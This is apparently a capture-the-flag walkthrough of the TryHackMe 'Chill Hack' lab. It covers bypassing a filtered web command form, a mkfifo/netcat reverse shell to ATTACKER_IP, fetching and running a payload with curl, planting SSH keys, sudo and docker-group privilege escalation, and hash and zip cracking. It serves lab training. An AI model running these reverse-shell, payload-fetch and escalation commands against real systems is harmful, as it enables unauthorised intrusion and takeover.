# Chill Hack Walkthrough
<br/>

## Intro
Welcome to the Lookup challenge, here is the link to the [room](https://tryhackme.com/room/chillhack) on TryHackMe.

This is a challenge about web vulnerabilities, hash cracking and privilege escalation.

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's Begin !

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP chill.thm" | sudo tee -a /etc/hosts
```

Now we scan for open ports with *nmap*:
```bash
nmap -sV -sC  chill.thm 
```

It finds 3 open ports:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:ATTACKER_IP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

There is an FTP server running on the default port 21, we can try to connect and see if the anonymous login is enabled:
```bash
ftp chill.thm
```

Now we enter the credentials `anonymous:anonymous`, it works!
Listing files we can see a note.txt, download it:
```bash
get note.txt
```

Now that is on our machine we can read the content:
```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

Let's take a look at the website: `http://chill.thm`.
We land on a website called "Game Info", while we familiarize with it we can start a directory scan in the background to find hidden ones:
```bash
gobuster dir -u http://chill.thm/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 160 
```

This finds
```
/css                  (Status: 301) [Size: 304] [--> http://chill.thm/css/]
/js                   (Status: 301) [Size: 303] [--> http://chill.thm/js/]
/images               (Status: 301) [Size: 307] [--> http://chill.thm/images/]
/fonts                (Status: 301) [Size: 306] [--> http://chill.thm/fonts/]
/secret               (Status: 301) [Size: 307] [--> http://chill.thm/secret/]
```

Well the `/secret` one definitely  deserve a visit, landing there we can see a form where we can insert a command to execute.
If we test with something like `ls` we get the message "Are you a hacker?" 
Testing other commands like `whoami` prints us the user name "www-data".

This is probably related to the note we found  before, some strings, hence commands, are filtered.
Let's try some other commands...

I can run `curl` to get files from my machine:
```bash
curl http://ATTACKER_IP:8000/test.txt
```

Since we are allowed with that we can create a reverse shell on our machine and save it into a file called `shell.sh`:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 1234 >/tmp/f
```

Now we serve it with a python server:
```bash
python3 -m http.server
```

We prepare a listener on our machine:
```bash
nc -lvnp 1234
```

Now we use `curl` to download the shell, `chmod` to make it executable and then run it:
```bash
curl -s http://ATTACKER_IP:8000/shell.sh -o /tmp/xfile && chmod +x /tmp/xfile && /tmp/xfile
```

This will successfully give us a shell.

Let's upgrade our shell (i made a guide [here](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Tips-%26-Resources/Reverse_Shell-Upgrade.md) on how to do it).

<br/>

### Privilege Escalation

#### Becoming Apaar
Exploring around we can find the user "Apaar", we have the permissions to navigate his home directory but not to  read the `local.txt` flag file.
Viewing another interesting files we see:
```bash
ls -la
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
```

Let's view it:
```bash
cat .helpline.sh
```

```bash
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

This script will ask to input the name of the person you wish to speak to and the message, BUT there is a flaw, the script might execute the message as command!

Check if we can run anything as `sudo`:
```bash
sudo -l
```

We do!:
```
User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

Our idea to exploit the helpline script was right, now let's do it:
```bash
sudo -u apaar /home/apaar/.helpline.sh
```

Now we can simply supply `bash` as message and we will get a shell as Apaar.
At this point we can read the flag:
```bash
cat local.txt
```

--> REDACTED_FLAG

Now for a more stable connection let's grant us permissions to access via SSH.
1. Go in the user `.ssh` directory and move away that file:
```bash
 mv authorized_keys authorized_keys.bak
```

On our machine:
Generate them:
```bash
ssh-keygen -t rsa -b 4096 -C "
```

Now you can copy your public key to the current working directory:
```bash
cp ~/.ssh/id_rsa.pub .
```

Start a python server:
```bash
python3 -m http.server
```

On the target machine create this directory: `~/.ssh`.
Download here your public key:
```bash
wget http://ATTACKER_IP:8000/id_rsa.pub
```

Rename the file:
```bash
mv id_rsa.pub authorized_key
```

Now we can finally login via SSH:
```bash
ssh apaar@chill.thm
```

Now we have a stable SSH connection.

#### Becoming Aurick
From my machine i transferred the `linpeas.sh` script on the target using a python HTTP server:
```bash
python3 -m http.server
```

On target:
```bash
wget http://ATTACKER_IP:8000/linpeas.sh
```

Now let's make the file executable and run it:
```bash
chmod +x linpeas.sh
```
```bash
./linpeas.sh > linpeas_report
```

We find 2 other open ports we did not find before (because they are accessible only from the localhost):
```
tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
```

Let's check what they hold.
```bash
 curl http://localhost:9001
```

This prints a login page.

While port 3306 is for mysql, if we try to interact we are required a password that we do not have, yet.

We need some credentials, let's check in the website (login page) if we can find any useful file
```bash
cd /var/www/files
```

```bash
 grep -lr password
```

There are 2 files with that keyword: `account.php` and `index.php`, let's open them

The index file actually contains some credentials for mysql:
```php
 $con = new PDO("mysql:dbname=webportal;host=localhost","root","REDACTED_PASSWORD"
```

Now we can open the database:
```bash
 mysql -h localhost -u root -D webportal -P 3306 -p 
```

```mysql
SHOW tables;
```
```mysql
SELECT * FROM users;
```

And we have user "Aurick" password:
```
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
```

This looks a bit log to be the real passwords, these are hashes; let's craack them:
--> `aurick:REDACTED_PASSWORD`

Now move to that user:
```bash
su aurick
```

This fails, maybe that person changed the password.

Back inside the directory we previously found the  MySQL credentials i found another interesting file called `hacker.php`, it contains a call to 2 images with the mesasge:
```html
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
```

So i decided to transfer that file on my machine:
```bash
nc -lvnp 4444 > hacker.png
```

On target:
```bash
 nc -nv ATTACKER_IP 4444 < hacker-with-laptop_23-2147985341.jpg
```

On my machine i ran `strings` to find any interesting text inside but nothing.
Let's see if there is any embedded data:
```bash
steghide --info hacker.jpg
```

Yes, there is inside file called `backup.zip`, let's extract it, it requires a password, let's try the one we have previously found:
```bash
steghide --extract -xf hacker.jpg -p 'masterpassword'
```

This password is useless, let's extract the file without inserting any password, we will take care of that later:
```bash
steghide --extract -xf hacker.jpg 
```

Now since we need a password to open the archive and we do not have it we crack it:
Make the hash for *John*:
```bash
zip2john  backup.zip > hash4john.txt
```

Now crack it:
```bash
john hash4john.txt --wordlist=rockyou.txt
```

This gives us the following password: `pass1word`.
Now extract the archive:
```bash
unzip backup.zip
```

It gives us a file, let's view it:
```bash
cat  source_code.php
```

We find a base64 encoded password, decode it:
```bash
echo "IWQwbnRLbjB3--REDACTED" | base64 -d
```

Here we have it: REDACTED

In that file we also find this message:
```
"Welcome Anurodh"
```

We can go back on the target machine and switch user:
```bash
su anurodh
```

#### Becoming Root
From the previous linepeas scan we saw that this user is in the docker group, alternatively you could check it with `id` or `groups $USER`.
Docker can be dangerous, in fact we can mount the filesystem as root:
```bash
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

This gives us a shell as root, we can now get the last flag:
```bash
cd /root; ls
```

```bash
cat proof.txt
```

<br/>
<br/>

## Conclusion
Congratulations you have successfully practiced with multiple privilege escalation and some light web exploitation and password creacking.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
